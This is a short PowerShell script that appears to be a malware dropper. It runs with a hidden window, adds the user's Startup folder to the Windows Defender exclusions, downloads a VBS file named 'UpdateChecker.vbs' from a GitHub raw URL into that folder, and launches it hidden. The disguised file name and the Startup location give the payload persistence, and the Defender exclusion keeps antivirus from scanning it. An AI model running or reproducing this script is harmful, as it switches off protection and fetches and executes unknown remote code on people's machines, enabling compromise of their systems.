powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$url = 'https://raw.githubusercontent.com/AmjadBalls/Ramizjaber12/refs/heads/main/UpdateChecker.vbs'
Invoke-WebRequest -Uri $url -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.vbs" 
Start-Process -FilePath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.vbs" -WindowStyle Hidden
